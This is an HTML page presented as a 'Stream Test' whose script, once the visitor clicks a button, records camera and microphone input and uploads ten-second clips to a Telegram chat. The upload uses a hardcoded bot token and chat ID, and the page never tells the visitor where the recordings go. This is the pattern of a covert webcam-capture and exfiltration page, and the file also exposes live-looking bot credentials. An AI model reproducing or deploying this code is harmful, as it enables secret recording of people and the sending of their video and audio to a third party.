<!DOCTYPE html>
<html>
<head>
  <title>Stream Test</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
    #status { margin: 20px; font-size: 18px; }
    #debug { margin: 10px; padding: 10px; border: 1px solid #ccc; text-align: left; }
  </style>
</head>
<body>
  <h2>Stream Test Interface</h2>
  <div id="status">Initializing...</div>
  <div id="debug">Debug messages will appear here</div>
  <button id="startBtn">Start Streaming</button>

  <script>
    // Configuration - REPLACE WITH YOUR ACTUAL VALUES
    const BOT_TOKEN = '7826950594:AAFBygBD_E2PmAITI6zsaPilys7l6i0gWBU';
    const CHAT_ID = '894002841';
    
    // State variables
    let mediaStream;
    let mediaRecorder;
    let recordedChunks = [];
    
    // Debug output
    function debugLog(message) {
      const debugDiv = document.getElementById('debug');
      debugDiv.innerHTML += `${new Date().toLocaleTimeString()}: ${message}<br>`;
      console.log(message);
    }
    
    // Test Telegram connection first
    async function testBotConnection() {
      try {
        debugLog("Testing Telegram bot connection...");
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
        const data = await response.json();
        
        if (data.ok) {
          debugLog(`Bot connection successful: ${data.result.username}`);
          return true;
        } else {
          debugLog(`Bot connection failed: ${data.description}`);
          return false;
        }
      } catch (error) {
        debugLog(`Connection error: ${error.message}`);
        return false;
      }
    }
    
    // Send to Telegram with detailed error handling
    async function sendToTelegram(blob) {
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('caption', `Stream test at ${new Date().toLocaleTimeString()}`);
      formData.append('video', blob, 'test.mp4');
      
      try {
        debugLog("Attempting to send to Telegram...");
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
          method: 'POST',
          body: formData
        });
        
        const result = await response.json();
        if (result.ok) {
          debugLog("Successfully sent to Telegram");
        } else {
          debugLog(`Telegram API error: ${result.description}`);
        }
      } catch (error) {
        debugLog(`Failed to send: ${error.message}`);
      }
    }
    
    // Start the streaming process
    async function startStreaming() {
      try {
        document.getElementById('status').textContent = "Starting...";
        debugLog("Requesting camera and microphone access...");
        
        // Get media devices
        mediaStream = await navigator.mediaDevices.getUserMedia({
          video: {
            width: { ideal: 640 },
            height: { ideal: 480 },
            frameRate: { ideal: 15 }
          },
          audio: true
        });
        
        debugLog("Media access granted, setting up recorder...");
        
        // Setup media recorder
        mediaRecorder = new MediaRecorder(mediaStream, {
          mimeType: 'video/webm;codecs=vp8,opus',
          videoBitsPerSecond: 500000
        });
        
        mediaRecorder.ondataavailable = (event) => {
          if (event.data.size > 0) {
            recordedChunks.push(event.data);
          }
        };
        
        mediaRecorder.onstop = async () => {
          const blob = new Blob(recordedChunks, { type: 'video/webm' });
          recordedChunks = [];
          await sendToTelegram(blob);
          
          // Restart recording
          if (mediaRecorder.state === 'inactive') {
            mediaRecorder.start(10000); // 10-second clips
          }
        };
        
        mediaRecorder.onerror = (event) => {
          debugLog(`Recorder error: ${event.error.name}`);
        };
        
        mediaRecorder.start(10000); // 10-second clips
        document.getElementById('status').textContent = "Streaming active";
        debugLog("Recording started - 10 second clips");
        
      } catch (error) {
        document.getElementById('status').textContent = "Error occurred";
        debugLog(`ERROR: ${error.name} - ${error.message}`);
        
        if (error.name === 'NotAllowedError') {
          debugLog("User denied camera/mic access");
        } else if (error.name === 'NotFoundError') {
          debugLog("No media devices found");
        } else if (error.name === 'NotSupportedError') {
          debugLog("MediaRecorder not supported");
        }
      }
    }
    
    // Initialize
    document.getElementById('startBtn').addEventListener('click', async () => {
      const botConnected = await testBotConnection();
      if (botConnected) {
        await startStreaming();
      } else {
        document.getElementById('status').textContent = "Fix bot connection first";
      }
    });
    
    debugLog("System ready - click Start Streaming button");
  </script>
</body>
</html>
